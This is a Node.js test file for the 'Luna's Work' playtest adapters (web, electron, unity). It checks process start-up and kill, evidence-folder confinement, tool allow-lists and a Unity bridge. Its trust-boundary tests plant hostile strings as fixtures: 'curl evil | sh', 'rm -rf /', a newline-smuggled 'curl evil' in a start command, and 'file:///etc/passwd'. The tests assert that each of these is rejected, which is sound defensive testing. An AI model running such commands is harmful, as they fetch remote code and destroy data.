// ============================================================================
// Luna's Work tester adapters: the web adapter's start / readiness / timeout /
// crash / stop-the-tree paths with fake spawn, fetch and clock; the evidence
// dir that cannot escape the runs folder; the profile-only start command.
// The electron adapter (fake spawn + fake control channel) and the unity
// adapter (fake Unity MCP); their tool lists; evidence per iteration; scene
// work routed to the one scene worker; the UnityYAMLMerge driver config; the
// PlaytestDriver card.
// Disk writes go to a temp runs root, never the real config/ directory.
// ============================================================================

'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { EventEmitter } = require('events');
const { PassThrough } = require('stream');

const A = require('../src/lunasworkAdapters.js');

const tmpDir = (prefix) => fs.mkdtempSync(path.join(os.tmpdir(), prefix));
const goodProfile = { adapter: 'web', startCommand: 'npm run dev', url: 'http://localhost:5173', readyTimeoutSec: 5 };

function fakeChild(pid = 4242) {
  const child = new EventEmitter();
  child.pid = pid;
  child.stdout = new PassThrough();
  child.stderr = new PassThrough();
  return child;
}

/**
 * A fake world: a clock advanced only by sleep, a spawn that records its calls,
 * a fetch answering from `statuses` (null = connection refused), and kill
 * recorders for both platforms.
 */
function fakeWorld({ statuses = [200], platform = 'win32', onSpawn } = {}) {
  const world = { t: 0, spawns: [], fetches: 0, execCalls: [], killCalls: [], child: null };
  const queue = [...statuses];
  world.opts = {
    projectDir: tmpDir('lw-project-'),
    runsRoot: path.join(tmpDir('lw-runs-'), 'runs'),
    runId: 'abc123',
    iteration: 1,
    platform,
    now: () => world.t,
    sleep: async (ms) => {
      world.t += ms;
    },
    spawn: (cmd, options) => {
      world.child = fakeChild();
      world.spawns.push({ cmd, options });
      if (onSpawn) onSpawn(world.child);
      return world.child;
    },
    fetch: async () => {
      world.fetches += 1;
      const status = queue.length > 1 ? queue.shift() : queue[0];
      if (status === null) throw new Error('ECONNREFUSED');
      return { status };
    },
    execFile: (file, args, options, cb) => {
      world.execCalls.push({ file, args });
      cb(null);
    },
    kill: (pid, signal) => {
      world.killCalls.push({ pid, signal });
    },
  };
  return world;
}

// ---- start / readiness --------------------------------------------------------------

test('web adapter starts, waits until the url answers, and returns it', async () => {
  const world = fakeWorld({ statuses: [null, null, 503, 200] });
  const adapter = A.createAdapter('web', world.opts);
  const result = await adapter.start(goodProfile);

  assert.deepEqual(result, { url: 'http://localhost:5173' });
  assert.equal(world.fetches, 4);
  assert.equal(world.spawns.length, 1);
  assert.equal(world.spawns[0].options.cwd, world.opts.projectDir);
  assert.equal(world.spawns[0].options.shell, true);
  await adapter.stop();
});

test('a 3xx redirect counts as ready', async () => {
  const world = fakeWorld({ statuses: [302] });
  const adapter = A.createAdapter('web', world.opts);
  assert.deepEqual(await adapter.start(goodProfile), { url: goodProfile.url });
  await adapter.stop();
});

test('readiness timeout stops the tree and rejects with a clear error', async () => {
  const world = fakeWorld({ statuses: [null] });
  const adapter = A.createAdapter('web', world.opts);

  await assert.rejects(adapter.start(goodProfile), /did not answer at http:\/\/localhost:5173 within 5s/);
  assert.ok(world.t >= 5000, 'waited the whole readyTimeoutSec');
  assert.deepEqual(world.execCalls, [{ file: 'taskkill', args: ['/PID', '4242', '/T', '/F'] }]);
});

test('a crash before ready rejects with the exit code and does not poll forever', async () => {
  const world = fakeWorld({
    statuses: [null],
    onSpawn: (child) => setImmediate(() => child.emit('exit', 1, null)),
  });
  // Let the exit event land before the second poll.
  world.opts.sleep = (ms) =>
    new Promise((resolve) =>
      setImmediate(() => {
        world.t += ms;
        resolve();
      }),
    );
  const adapter = A.createAdapter('web', world.opts);

  await assert.rejects(adapter.start(goodProfile), /exited before it was ready \(code 1/);
  assert.ok(world.t < 5000, 'gave up as soon as the app died');
  assert.equal(world.execCalls.length, 0, 'nothing left to kill');
});

// ---- LW 2.21a: seed before the Playtester -----------------------------------------------

/** A world whose spawn exits the seed command with `seedCode`; the app child stays up. */
function seedWorld(seedCode, statuses = [200]) {
  const world = fakeWorld({ statuses });
  const spawn = world.opts.spawn;
  world.order = [];
  world.opts.spawn = (cmd, options) => {
    const child = spawn(cmd, options);
    world.order.push(cmd);
    if (cmd === 'npm run seed') setImmediate(() => child.emit('exit', seedCode, null));
    return child;
  };
  return world;
}

test('LW 2.21a: the seedCommand runs to completion in the project dir before the app starts', async () => {
  const world = seedWorld(0);
  const adapter = A.createAdapter('web', world.opts);
  const result = await adapter.start({ ...goodProfile, seedCommand: 'npm run seed' });

  assert.deepEqual(result, { url: 'http://localhost:5173' });
  assert.deepEqual(world.order, ['npm run seed', 'npm run dev'], 'seed first, then the app');
  assert.equal(world.spawns[0].options.cwd, world.opts.projectDir);
  assert.equal(world.spawns[0].options.shell, true);
  await adapter.stop();
  const log = fs.readFileSync(path.join(adapter.evidenceDir, A.SERVER_LOG), 'utf8');
  assert.match(log, /seed \$ npm run seed/);
  assert.match(log, /seed exited code=0/);
});

test('LW 2.21a: a failing seed fails the start and the app is never launched', async () => {
  const world = seedWorld(2);
  const adapter = A.createAdapter('web', world.opts);

  await assert.rejects(adapter.start({ ...goodProfile, seedCommand: 'npm run seed' }), /seed command exited with code 2/);
  assert.deepEqual(world.order, ['npm run seed'], 'no app process');
  assert.equal(world.fetches, 0, 'never polled');
});

test('LW 2.21a: without a seedCommand only the app is spawned', async () => {
  const world = seedWorld(0);
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);
  assert.deepEqual(world.order, ['npm run dev']);
  await adapter.stop();
});

test('stdout and stderr go to server.log in the evidence dir', async () => {
  const world = fakeWorld({
    statuses: [null, 200],
    onSpawn: (child) => {
      child.stdout.write('vite ready\n');
      child.stderr.write('warn: something\n');
    },
  });
  // One real tick between polls, so the streams flow before stop().
  world.opts.sleep = (ms) =>
    new Promise((resolve) =>
      setImmediate(() => {
        world.t += ms;
        resolve();
      }),
    );
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);
  await adapter.stop();
  // Output after stop is dropped, not a write-after-end crash.
  world.child.stdout.write('late output\n');
  await new Promise((resolve) => setImmediate(resolve));

  const log = fs.readFileSync(path.join(adapter.evidenceDir, A.SERVER_LOG), 'utf8');
  assert.match(log, /\$ npm run dev/);
  assert.match(log, /vite ready/);
  assert.match(log, /warn: something/);
});

test('starting twice is refused', async () => {
  const world = fakeWorld();
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);
  await assert.rejects(adapter.start(goodProfile), /already started/);
  await adapter.stop();
});

// ---- stop ---------------------------------------------------------------------------

test('stop kills the whole tree with taskkill /T /F on Windows, once', async () => {
  const world = fakeWorld({ platform: 'win32' });
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);

  assert.equal(await adapter.stop(), true);
  await adapter.stop();
  assert.deepEqual(world.execCalls, [{ file: 'taskkill', args: ['/PID', '4242', '/T', '/F'] }]);
});

test('stop kills the process group on POSIX (spawned detached)', async () => {
  const world = fakeWorld({ platform: 'linux' });
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);

  assert.equal(world.spawns[0].options.detached, true);
  assert.equal(await adapter.stop(), true);
  assert.deepEqual(world.killCalls, [{ pid: -4242, signal: 'SIGKILL' }]);
});

test('POSIX falls back to the single pid when the group is gone', async () => {
  const calls = [];
  const kill = (pid) => {
    calls.push(pid);
    if (pid < 0) throw new Error('ESRCH');
  };
  assert.equal(await A.killTree(77, { platform: 'darwin', kill }), true);
  assert.deepEqual(calls, [-77, 77]);
});

test('stop before start is a harmless no-op', async () => {
  const world = fakeWorld();
  const adapter = A.createAdapter('web', world.opts);
  assert.equal(await adapter.stop(), true);
  assert.equal(world.execCalls.length, 0);
});

// ---- trust boundary: the command comes only from the profile ----------------------

test('a start command in the project repo is ignored - only the profile runs', async () => {
  const world = fakeWorld();
  const repo = world.opts.projectDir;
  fs.writeFileSync(path.join(repo, 'package.json'), JSON.stringify({ scripts: { dev: 'curl evil | sh', start: 'rm -rf /' } }));
  fs.writeFileSync(path.join(repo, 'lunaswork.json'), JSON.stringify({ startCommand: 'curl evil | sh' }));
  const adapter = A.createAdapter('web', world.opts);

  await adapter.start({ ...goodProfile, startCommand: 'npm run dev' });
  assert.deepEqual(
    world.spawns.map((s) => s.cmd),
    ['npm run dev'],
  );
  await adapter.stop();
});

test('an invalid profile is rejected before anything is spawned', async () => {
  for (const bad of [
    null,
    { ...goodProfile, startCommand: '' },
    { ...goodProfile, startCommand: 'npm run dev\ncurl evil' },
    { ...goodProfile, url: 'file:///etc/passwd' },
    { ...goodProfile, adapter: 'unity' },
  ]) {
    const world = fakeWorld();
    const adapter = A.createAdapter('web', world.opts);
    await assert.rejects(adapter.start(bad), /invalid project profile/);
    assert.equal(world.spawns.length, 0);
  }
});

// ---- evidence dir -------------------------------------------------------------------

test('evidence dir is runs/lunaswork-<runId>/iter-<N>', () => {
  const root = path.resolve(tmpDir('lw-runs-'));
  assert.equal(A.evidenceDirFor(root, 'abc123', 3), path.join(root, 'lunaswork-abc123', 'iter-3'));
});

test('evidence dir cannot escape the runs folder', () => {
  const root = path.resolve(tmpDir('lw-runs-'));
  for (const runId of ['../x', '..', 'a/b', 'a\\b', 'C:', '', 'ABC', 'a'.repeat(41), 42, null]) {
    assert.throws(() => A.evidenceDirFor(root, runId, 1), /runId/, `runId ${String(runId)}`);
  }
  for (const iteration of [0, -1, 1.5, '1', '../1', 10001, NaN]) {
    assert.throws(() => A.evidenceDirFor(root, 'abc', iteration), /iteration/, `iteration ${String(iteration)}`);
  }
});

test('createAdapter refuses a bad runId before touching the disk', () => {
  const world = fakeWorld();
  assert.throws(() => A.createAdapter('web', { ...world.opts, runId: '../../etc' }), /runId/);
  assert.equal(fs.existsSync(world.opts.runsRoot), false);
});

// ---- tools --------------------------------------------------------------------------

test('tools() is the Playwright MCP config and its allow-list only', async () => {
  const world = fakeWorld();
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);
  const { mcpConfig, allowedTools } = adapter.tools();

  assert.deepEqual(Object.keys(mcpConfig.mcpServers), ['playwright']);
  const args = mcpConfig.mcpServers.playwright.args;
  assert.ok(args.includes('--headless'));
  assert.equal(args[args.indexOf('--output-dir') + 1], adapter.evidenceDir);
  assert.equal(args[args.indexOf('--allowed-origins') + 1], 'http://localhost:5173');
  assert.ok(allowedTools.length > 0);
  assert.ok(allowedTools.every((t) => t.startsWith('mcp__playwright__browser_')));
  for (const forbidden of ['Read', 'Grep', 'Edit', 'Bash', 'mcp__playwright__browser_evaluate', 'mcp__playwright__browser_file_upload']) {
    assert.ok(!allowedTools.includes(forbidden), forbidden);
  }
  await adapter.stop();
});

test('tools() returns fresh objects - editing one does not widen the next', () => {
  const adapter = A.createAdapter('web', fakeWorld().opts);
  adapter.tools().allowedTools.push('Bash');
  assert.ok(!adapter.tools().allowedTools.includes('Bash'));
});

// ---- unknown adapters ---------------------------------------------------------------

test('web, electron and unity exist; anything else is unknown', () => {
  const opts = fakeWorld().opts;
  assert.deepEqual(A.ADAPTER_NAMES, ['web', 'electron', 'unity']);
  assert.equal(A.createAdapter('electron', opts).name, 'electron');
  assert.equal(A.createAdapter('unity', opts).name, 'unity');
  assert.throws(() => A.createAdapter('ssh', opts), /unknown tester adapter 'ssh'/);
  assert.throws(() => A.createAdapter('__proto__', opts), /unknown tester adapter/);
});

test('projectDir must be absolute', () => {
  const opts = fakeWorld().opts;
  assert.throws(() => A.createAdapter('web', { ...opts, projectDir: 'relative/dir' }), /absolute/);
});

// ---- browser matrix -------------------------------------------------------------------

test('tools({matrix}) starts one Playwright MCP per engine with --browser and the viewport', async () => {
  const world = fakeWorld();
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);
  const matrix = [
    { engine: 'chromium', device: 'desktop', width: 1440, height: 900 },
    { engine: 'firefox', device: 'tablet', width: 820, height: 1180 },
  ];
  const { mcpConfig, allowedTools } = adapter.tools({ matrix });
  const servers = mcpConfig.mcpServers;
  assert.deepEqual(Object.keys(servers), ['playwright', 'playwright-firefox']);

  const after = (args, flag) => args[args.indexOf(flag) + 1];
  assert.equal(after(servers.playwright.args, '--browser'), 'chromium');
  assert.equal(after(servers.playwright.args, '--viewport-size'), '1440x900');
  assert.equal(after(servers['playwright-firefox'].args, '--browser'), 'firefox');
  assert.equal(after(servers['playwright-firefox'].args, '--viewport-size'), '820x1180');
  for (const s of Object.values(servers)) {
    assert.equal(after(s.args, '--allowed-origins'), 'http://localhost:5173', 'every engine is origin-locked');
  }
  assert.ok(allowedTools.includes('mcp__playwright-firefox__browser_click'));
  assert.ok(!allowedTools.some((t) => t.endsWith('browser_evaluate')));
  await adapter.stop();
});

test('tools() without a matrix is the chromium desktop baseline; unknown engines are dropped', () => {
  const adapter = A.createAdapter('web', fakeWorld().opts);
  const base = adapter.tools().mcpConfig.mcpServers;
  assert.deepEqual(Object.keys(base), ['playwright']);
  assert.ok(base.playwright.args.join(' ').includes('--browser chromium --viewport-size 1440x900'));
  const bad = adapter.tools({ matrix: [{ engine: 'ie6', width: 800, height: 600 }, { engine: 'webkit', width: -1, height: 9 }] });
  assert.deepEqual(Object.keys(bad.mcpConfig.mcpServers), ['playwright']);
});

test('ensureBrowsers installs missing engines once, logged, then skips', async () => {
  const world = fakeWorld();
  const adapter = A.createAdapter('web', world.opts);
  const matrix = [{ engine: 'chromium', width: 1440, height: 900 }, { engine: 'webkit', width: 390, height: 844 }];

  const first = await adapter.ensureBrowsers(matrix);
  assert.deepEqual(first, { ok: true, installed: ['chromium', 'webkit'] });
  assert.equal(world.execCalls.length, 1);
  assert.equal(world.execCalls[0].file, 'npx -y --package=@playwright/mcp@latest playwright install chromium webkit');
  const log = fs.readFileSync(path.join(adapter.evidenceDir, A.BROWSERS_LOG), 'utf8');
  assert.match(log, /first use of chromium, webkit/);
  assert.match(log, /installed chromium, webkit/);

  const again = await adapter.ensureBrowsers(matrix);
  assert.deepEqual(again, { ok: true, installed: [] });
  assert.equal(world.execCalls.length, 1, 'no second install');

  await adapter.ensureBrowsers([{ engine: 'firefox', width: 820, height: 1180 }]);
  assert.match(world.execCalls[1].file, /playwright install firefox$/);
});

test('ensureBrowsers reports a failed install and does not record it', async () => {
  const world = fakeWorld();
  world.opts.execFile = (file, args, options, cb) => {
    world.execCalls.push({ file, args });
    cb(new Error('network down'));
  };
  const adapter = A.createAdapter('web', world.opts);
  const res = await adapter.ensureBrowsers([{ engine: 'firefox', width: 820, height: 1180 }]);
  assert.equal(res.ok, false);
  assert.match(res.error, /network down/);
  assert.equal(fs.existsSync(path.join(world.opts.runsRoot, A.BROWSERS_MARKER)), false);
  assert.match(fs.readFileSync(path.join(adapter.evidenceDir, A.BROWSERS_LOG), 'utf8'), /install failed/);
});

test('ensureBrowsers runs outside the project and reinstalls once the marker is a day old', async () => {
  const world = fakeWorld();
  const calls = [];
  world.opts.execFile = (file, args, options, cb) => {
    calls.push(options);
    cb(null);
  };
  const adapter = A.createAdapter('web', world.opts);
  const matrix = [{ engine: 'chromium', width: 1440, height: 900 }];
  await adapter.ensureBrowsers(matrix);
  assert.equal(path.resolve(calls[0].cwd), path.resolve(world.opts.runsRoot));

  world.t += 60 * 60 * 1000;
  await adapter.ensureBrowsers(matrix);
  assert.equal(calls.length, 1, 'fresh marker: skipped');
  world.t += 24 * 60 * 60 * 1000;
  await adapter.ensureBrowsers(matrix);
  assert.equal(calls.length, 2, 'expired marker: installed again');
});

// ============================================================================
// electron adapter (LW 3.35)
// ============================================================================

const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.from('fake image')]).toString('base64');
const READY_LINE = '[luna-playtest] ready {"port":51234,"windows":1}\n';
const TOKEN = 'a'.repeat(64);
const electronProfile = { adapter: 'electron', startCommand: 'npm start', readyTimeoutSec: 5 };

/** One real tick per sleep, so stream data and exit events land between polls. */
const tickingSleep = (world) => (ms) =>
  new Promise((resolve) =>
    setImmediate(() => {
      world.t += ms;
      resolve();
    }),
  );

/**
 * fakeWorld plus the wrapper's control channel: the app prints the ready line
 * (unless `ready` is false) and answers list_windows / screenshot / quit.
 * `exitOnQuit` false = an app (or the npm around it) that ignores the quit.
 */
function electronWorld({ ready = true, exitOnQuit = true, platform = 'win32', iteration = 1, runsRoot, onSpawn } = {}) {
  const world = fakeWorld({
    platform,
    onSpawn: (child) => {
      if (ready) child.stdout.write(`electron booting\n${READY_LINE}`);
      if (onSpawn) onSpawn(child);
    },
  });
  world.controlCalls = [];
  world.opts.iteration = iteration;
  if (runsRoot) world.opts.runsRoot = runsRoot;
  world.opts.sleep = tickingSleep(world);
  world.opts.env = { PATH: 'x', NODE_OPTIONS: '--max-old-space-size=4096', ELECTRON_RUN_AS_NODE: '1' };
  world.opts.newToken = () => TOKEN;
  world.opts.nodeBinary = 'C:\\LunaCore\\LunaCore.exe';
  world.opts.callControl = async (control, tool, args) => {
    world.controlCalls.push({ control, tool, args });
    if (tool === 'list_windows') return { windows: [{ id: 1, title: 'Main' }, { id: 2, title: 'Settings' }] };
    if (tool === 'screenshot') return { png: PNG, width: 800, height: 600 };
    if (tool === 'quit') {
      if (exitOnQuit) setImmediate(() => world.child.emit('exit', 0, null));
      return { quitting: true };
    }
    throw new Error(`unexpected control call ${tool}`);
  };
  return world;
}

const E = require('../src/lunasworkElectron.js');
const U = require('../src/lunasworkUnity.js');
const Scene = require('../src/lunasworkScene.js');
const { BRIDGE_PATH, WRAPPER_PATH, SERVER_NAMES } = require('../src/lunasworkBridge.js');
const { toolNames } = require('../helpers/playtest-bridge/tools.js');
const { createBridge, unityBackend } = require('../helpers/playtest-bridge/bridge.js');
const UN = require('../helpers/playtest-bridge/unity.js');
const { normalizeTodo, runTag } = require('../src/todorows.js');
const { createGodModeBuilder } = require('../src/lunasworkBuild.js');

const isPng = (file) => fs.readFileSync(file).subarray(0, 4).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47]));

test('electron start launches the profile command with the in-process wrapper and waits for the first window', async () => {
  const world = electronWorld();
  const adapter = A.createAdapter('electron', world.opts);
  const res = await adapter.start(electronProfile);

  assert.deepEqual(res, { handle: { kind: 'electron', pid: 4242, windows: 1 } });
  assert.equal(world.spawns.length, 1);
  const { cmd, options } = world.spawns[0];
  assert.equal(cmd, 'npm start');
  assert.equal(options.cwd, world.opts.projectDir);
  assert.equal(options.shell, true);
  // No CDP port: the wrapper is preloaded into the app's main process.
  assert.equal(options.env.NODE_OPTIONS, E.nodeOptionsWith('--max-old-space-size=4096', WRAPPER_PATH));
  assert.ok(options.env.NODE_OPTIONS.startsWith('--max-old-space-size=4096 --require "'));
  assert.ok(!/remote-debugging-port|--inspect/.test(`${cmd} ${options.env.NODE_OPTIONS}`));
  assert.equal(options.env.LUNA_PLAYTEST_TOKEN, TOKEN);
  assert.equal('ELECTRON_RUN_AS_NODE' in options.env, false, 'the app must not start as plain Node');
  assert.equal(world.opts.env.ELECTRON_RUN_AS_NODE, '1', "LunaCore's own env is not touched");

  const control = JSON.parse(fs.readFileSync(path.join(adapter.evidenceDir, E.CONTROL_FILE), 'utf8'));
  assert.deepEqual(control, { port: 51234, token: TOKEN });
  await adapter.stop();
});

test('electron stop takes final screenshots, quits, then kills the whole tree once', async () => {
  const world = electronWorld({ exitOnQuit: false });
  const adapter = A.createAdapter('electron', world.opts);
  await adapter.start(electronProfile);

  assert.equal(await adapter.stop(), true);
  await adapter.stop();
  assert.deepEqual(
    world.controlCalls.map((c) => [c.tool, c.args]),
    [
      ['list_windows', {}],
      ['screenshot', { name: 'final-1.png', windowId: 1 }],
      ['screenshot', { name: 'final-2.png', windowId: 2 }],
      ['quit', {}],
    ],
  );
  assert.ok(world.controlCalls.every((c) => c.control.port === 51234 && c.control.token === TOKEN));
  assert.deepEqual(world.execCalls, [{ file: 'taskkill', args: ['/PID', '4242', '/T', '/F'] }]);
  assert.ok(isPng(path.join(adapter.evidenceDir, 'final-1.png')));
  assert.ok(isPng(path.join(adapter.evidenceDir, 'final-2.png')));
  assert.equal(fs.existsSync(path.join(adapter.evidenceDir, E.CONTROL_FILE)), false, 'the token file is gone');
  assert.match(fs.readFileSync(path.join(adapter.evidenceDir, E.APP_LOG), 'utf8'), /\$ npm start[\s\S]*electron booting/);
});

test('electron stop kills the process group on POSIX', async () => {
  const world = electronWorld({ exitOnQuit: false, platform: 'linux' });
  const adapter = A.createAdapter('electron', world.opts);
  await adapter.start(electronProfile);

  assert.equal(world.spawns[0].options.detached, true);
  assert.equal(await adapter.stop(), true);
  assert.deepEqual(world.killCalls, [{ pid: -4242, signal: 'SIGKILL' }]);
});

test('an app that quits gracefully leaves nothing to kill', async () => {
  const world = electronWorld({ exitOnQuit: true });
  const adapter = A.createAdapter('electron', world.opts);
  await adapter.start(electronProfile);
  assert.equal(await adapter.stop(), true);
  assert.deepEqual(world.execCalls, []);
});

test('electron: no window within readyTimeoutSec kills the tree and rejects', async () => {
  const world = electronWorld({ ready: false });
  const adapter = A.createAdapter('electron', world.opts);

  await assert.rejects(adapter.start(electronProfile), /no app window loaded within 5s - see .*app\.log/);
  assert.ok(world.t >= 5000);
  assert.deepEqual(world.execCalls, [{ file: 'taskkill', args: ['/PID', '4242', '/T', '/F'] }]);
  assert.equal(world.controlCalls.length, 0, 'no control channel without the ready line');
  assert.equal(fs.existsSync(path.join(adapter.evidenceDir, E.CONTROL_FILE)), false);
  assert.deepEqual(adapter.tools().allowedTools, []);
});

test('electron: an app that exits before its window rejects at once', async () => {
  const world = electronWorld({ ready: false, onSpawn: (child) => setImmediate(() => child.emit('exit', 1, null)) });
  const adapter = A.createAdapter('electron', world.opts);

  await assert.rejects(adapter.start(electronProfile), /exited before its first window loaded \(code 1/);
  assert.ok(world.t < 5000);
  assert.equal(world.execCalls.length, 0);
});

test('electron: the command comes only from a valid electron profile', async () => {
  for (const bad of [null, { ...electronProfile, startCommand: '' }, { ...electronProfile, startCommand: 'npm start\ncurl evil' }, { ...electronProfile, adapter: 'web' }]) {
    const world = electronWorld();
    const adapter = A.createAdapter('electron', world.opts);
    await assert.rejects(adapter.start(bad), /invalid project profile/);
    assert.equal(world.spawns.length, 0);
  }
  const world = electronWorld();
  const adapter = A.createAdapter('electron', world.opts);
  await adapter.start(electronProfile);
  await assert.rejects(adapter.start(electronProfile), /already started/);
  await adapter.stop();
});

test('NODE_OPTIONS escapes the wrapper path for Node and keeps earlier options', () => {
  assert.equal(E.nodeOptionsWith(undefined, 'C:\\Program Files\\Luna\\w.js'), '--require "C:\\\\Program Files\\\\Luna\\\\w.js"');
  assert.equal(E.nodeOptionsWith('  --trace-warnings ', '/opt/a"b.js'), '--trace-warnings --require "/opt/a\\"b.js"');
  assert.deepEqual(E.parseReady(READY_LINE.trim()), { port: 51234, windows: 1 });
  for (const line of ['[luna-playtest] ready {"port":0}', '[luna-playtest] ready nope', 'ready {"port":5}']) {
    assert.equal(E.parseReady(line), null, line);
  }
});

test('electron tools() is the bridge on this run only, after start', async () => {
  const world = electronWorld();
  const adapter = A.createAdapter('electron', world.opts);
  assert.deepEqual(adapter.tools(), { mcpConfig: { mcpServers: {} }, allowedTools: [] }, 'nothing before start');
  await adapter.start(electronProfile);

  const { mcpConfig, allowedTools } = adapter.tools();
  const server = mcpConfig.mcpServers[SERVER_NAMES.electron];
  assert.deepEqual(Object.keys(mcpConfig.mcpServers), [SERVER_NAMES.electron]);
  assert.equal(server.command, world.opts.nodeBinary);
  assert.deepEqual(server.args, [
    BRIDGE_PATH,
    '--backend', 'electron',
    '--evidence-dir', adapter.evidenceDir,
    '--control', path.join(adapter.evidenceDir, E.CONTROL_FILE),
  ]);
  assert.equal(server.env.ELECTRON_RUN_AS_NODE, '1');
  assert.deepEqual(allowedTools, toolNames('electron').map((t) => `mcp__${SERVER_NAMES.electron}__${t}`));
  await adapter.stop();
  assert.deepEqual(adapter.tools().allowedTools, [], 'nothing after stop');
});

// ============================================================================
// unity adapter (LW 3.36b) - a fake Unity MCP (MCP for Unity's answer shape)
// ============================================================================

// Legacy MCP for Unity: the profile names the server's url. Without one the
// adapter talks to the official Unity MCP (Unity Pipeline) - see below.
const unityProfile = { adapter: 'unity', unityMcpUrl: 'http://127.0.0.1:8080/mcp', scene: 'Assets/Scenes/Level1.unity', readyTimeoutSec: 5 };
const unityReply = (data) => ({ content: [{ type: 'text', text: JSON.stringify({ success: true, message: 'ok', data }) }] });

function fakeUnity({ playingAfter = 2, driver = true } = {}) {
  const u = { calls: [], urls: [], sessions: 0, closed: 0, polls: 0 };
  u.connect = (url) => {
    u.sessions += 1;
    u.urls.push(url);
    return {
      callTool: async (name, args) => {
        u.calls.push([name, args]);
        if (name === 'manage_editor' && args.action === 'get_state') {
          u.polls += 1;
          return unityReply({ isPlaying: u.polls >= playingAfter });
        }
        if (name === 'manage_editor' || name === 'manage_scene') return unityReply({});
        if (name === 'read_console') return unityReply([{ type: 'error', message: 'NullReferenceException in Enemy.Update' }]);
        if (name === 'execute_custom_tool') {
          if (!driver) return { isError: true, content: [{ type: 'text', text: "Tool 'playtest_driver' not found" }] };
          const { action, steps } = args.parameters;
          if (action === 'state') return unityReply({ scene: 'Level1', score: 3 });
          if (action === 'screenshot') return unityReply({ png: PNG, width: 1920, height: 1080 });
          if (action === 'input') return unityReply({ done: steps.length });
        }
        throw new Error(`unexpected Unity MCP call ${name}`);
      },
      close: async () => {
        u.closed += 1;
      },
    };
  };
  return u;
}

function unityWorld(unityOpts, { iteration = 1, runsRoot } = {}) {
  const world = fakeWorld();
  world.unity = fakeUnity(unityOpts);
  world.logs = [];
  world.opts.iteration = iteration;
  if (runsRoot) world.opts.runsRoot = runsRoot;
  world.opts.connectUnity = world.unity.connect;
  world.opts.nodeBinary = 'C:\\LunaCore\\LunaCore.exe';
  world.opts.log = (line) => world.logs.push(line);
  return world;
}

const callNames = (calls) => calls.map(([name, args]) => `${name}:${args.action || args.parameters.action}`);

test('unity start opens the scene, enters play mode, waits for it and checks the PlaytestDriver - one session', async () => {
  const world = unityWorld();
  const adapter = A.createAdapter('unity', world.opts);
  const res = await adapter.start(unityProfile);

  assert.deepEqual(res, { handle: { kind: 'unity', scene: 'Assets/Scenes/Level1.unity' } });
  assert.deepEqual(callNames(world.unity.calls), [
    'manage_scene:load',
    'manage_editor:play',
    'manage_editor:get_state',
    'manage_editor:get_state',
    'execute_custom_tool:state',
  ]);
  assert.equal(world.unity.calls[0][1].path, 'Assets/Scenes/Level1.unity');
  assert.deepEqual([world.unity.sessions, world.unity.closed], [1, 1], 'one editor = one connection, closed again');
  assert.deepEqual(world.unity.urls, ['http://127.0.0.1:8080/mcp']);
  assert.equal(world.spawns.length, 0, 'nothing is launched: the editor is already open');
  await adapter.stop();
});

test('unity stop saves console, state and a final screenshot, then leaves play mode once', async () => {
  const world = unityWorld();
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(unityProfile);
  world.unity.calls.length = 0;

  assert.equal(await adapter.stop(), true);
  await adapter.stop();
  assert.deepEqual(callNames(world.unity.calls), [
    'read_console:get',
    'execute_custom_tool:state',
    'execute_custom_tool:screenshot',
    'manage_editor:stop',
  ]);
  const consoleDump = JSON.parse(fs.readFileSync(path.join(adapter.evidenceDir, U.CONSOLE_FILE), 'utf8'));
  assert.match(JSON.stringify(consoleDump), /NullReferenceException/);
  assert.deepEqual(JSON.parse(fs.readFileSync(path.join(adapter.evidenceDir, U.STATE_FILE), 'utf8')), { scene: 'Level1', score: 3 });
  assert.ok(isPng(path.join(adapter.evidenceDir, U.FINAL_SHOT)));
  assert.deepEqual(adapter.tools().allowedTools, []);
});

test('unity tools() is the bridge on the profile Unity MCP url, after start', async () => {
  const world = unityWorld();
  const adapter = A.createAdapter('unity', world.opts);
  assert.deepEqual(adapter.tools().allowedTools, [], 'nothing before play mode');
  await adapter.start({ ...unityProfile, unityMcpUrl: 'http://localhost:6400/mcp' });

  const { mcpConfig, allowedTools } = adapter.tools();
  assert.deepEqual(Object.keys(mcpConfig.mcpServers), [SERVER_NAMES.unity]);
  assert.deepEqual(mcpConfig.mcpServers[SERVER_NAMES.unity].args, [
    BRIDGE_PATH,
    '--backend', 'unity',
    '--evidence-dir', adapter.evidenceDir,
    '--unity-url', 'http://localhost:6400/mcp',
  ]);
  assert.deepEqual(allowedTools, toolNames('unity').map((t) => `mcp__${SERVER_NAMES.unity}__${t}`));
  await adapter.stop();
});

test('unity play / screenshot / console / input through the bridge, one short session per call', async () => {
  const unity = fakeUnity();
  const evidenceDir = tmpDir('lw-unity-ev-');
  const slept = [];
  const bridge = createBridge({
    backend: 'unity',
    evidenceDir,
    invoke: unityBackend({ connect: () => unity.connect('http://127.0.0.1:8080/mcp'), sleep: async (ms) => slept.push(ms) }),
  });

  const shot = await bridge.callTool('screenshot', { name: 'f1-pause-menu' });
  assert.equal(shot.isError, undefined);
  assert.match(shot.content[0].text, /f1-pause-menu\.png/);
  assert.deepEqual(shot.content[1], { type: 'image', data: PNG, mimeType: 'image/png' });
  assert.ok(isPng(path.join(evidenceDir, 'f1-pause-menu.png')));

  const state = await bridge.callTool('game_state', {});
  assert.deepEqual(JSON.parse(state.content[0].text), { scene: 'Level1', score: 3 });

  const steps = [{ type: 'key', key: 'Space', holdMs: 100 }, { type: 'ui', name: 'PlayButton' }];
  const input = await bridge.callTool('send_input', { steps });
  assert.deepEqual(JSON.parse(input.content[0].text), { done: 2 });
  assert.deepEqual(unity.calls.at(-1), ['execute_custom_tool', { tool_name: 'playtest_driver', parameters: { steps, action: 'input' } }]);

  const errors = await bridge.callTool('console_errors', {});
  assert.match(errors.content[0].text, /NullReferenceException/);
  assert.deepEqual(unity.calls.at(-1)[0], 'read_console');

  await bridge.callTool('wait', { ms: 750 });
  assert.deepEqual(slept, [750]);
